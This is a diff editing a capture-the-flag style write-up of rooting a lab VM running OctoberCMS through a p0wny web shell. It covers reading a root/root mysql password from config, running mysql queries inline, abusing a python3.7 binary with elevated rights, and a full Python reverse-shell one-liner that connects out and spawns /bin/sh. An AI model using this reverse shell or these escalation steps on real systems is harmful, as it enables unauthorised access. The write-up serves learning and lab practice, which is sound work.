@@ -52,11 +52,9 @@ Nice.
 
 ## Enumeration
 
-There was no sudo or nc on the machine, and via the shell I still couldn't connect out. The shell I was using is a little limited its not super interactive, meaning things that prompt for input cannot be used. It does allow command history and autocompletion however, which is nice.
-
 Browsing around I found a /armour user and home folder with nothing in it. Not much else.
 
-I decided to browse the octobercms folders and found a /config/database.php file, which revealed the local mysql instance had a nice root/root password on it. A quick look at the tables revealed little that stood out (since p0wny is not interactive I couldn't open the mysql cli - instead I had to execute on the same line: `mysql -u root -proot -e "select TABLE_SCHEMA, table_name from information_schema.tables"`). The user tables just contained the root user I already had.
+I decided to browse the octobercms folders and found a /config/database.php file, which revealed the local mysql instance had a nice `root`/`root` username/password on it. A quick look at the tables revealed little that stood out (since p0wny is not interactive I couldn't open the mysql cli - instead I had to execute on the same line: `mysql -u root -proot -e "select TABLE_SCHEMA, table_name from information_schema.tables"`). The user tables just contained the root user I already had.
 
 At this point things got slower. I did a lot of enumeration, carefully examining things piece by piece. Nothing of note seemed to be running under cron, the webservers were all www-data, I could see inside the sole /home folder (/home/armour) but there was nothing in it. sudo wasn't present, netcat wasn't precent, /dev/tcp wasn't there. Tough.
 
@@ -84,17 +82,15 @@ lrwxrwxrwx 1 root root       9 Mar 26  2019 /usr/bin/python3 -> python3.7
 lrwxrwxrwx 1 root root      10 Mar 26  2019 /usr/bin/python3m -> python3.7m
 ```
 
-So...python can run as root. Interesting...
+So...python3.7 rusn as root. Interesting...
 
 ## Improving my shell
 
-The problem with python is that python3.7 -c "import os; os.system('whoami')" returns "www-data" still. I thought that what this meant was that python drops priveleges with the -c command. This is **not true**, but I didn't discover that til later.
+The problem was that `python3.7 -c "import os; os.system('whoami')"` returned `www-data` still. I thought that what this meant was that python drops priveleges with the -c command. This is **not true**, but I didn't discover that until later.
 
 What I thought I needed was to open python interactively, and my p0wny shell wouldn't let me do that. So how to upgrade?
 
-`nc` wasn't there, neither was `/dev/tcp`. I had a python obviously, so I used a oneliner from here: http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
-
-Specifically:
+`nc` wasn't there, neither was `/dev/tcp`. However, I had python obviously, so I used a oneliner from here: http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet. Specifically (replacing the IP and port as appropriate):
 
 ```
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
@@ -116,9 +112,9 @@ fn.write("hello world");
 fn.close();
 ```
 
-> After I finished the whole VM I came back and tested, using the p0wny shell without my upgraded reverse shell, whether this worked: `/usr/bin/python3.7 -c "fn = open('/home/armour/test2.txt', 'w'); fn.write('test'); fn.close();"`. It worked fine, so the upgraded shell was entirely unnecessary. However, learning how to do one with python and having that one liner resource page in general is quite nice.
-
 Browsing to that folder with p0wny shell, I could see the file was created and contained my content. Ok, great! I'm root!
+
+> After I finished the whole VM I came back and tested using the p0wny shell without my upgraded reverse shell whether this worked: `/usr/bin/python3.7 -c "fn = open('/home/armour/test2.txt', 'w'); fn.write('test'); fn.close();"`. It worked fine, so the upgraded shell was entirely unnecessary. However, learning how to do one with python and having that one liner resource page in general is quite nice.
 
 Next step was to check the contents of `/root`:
 
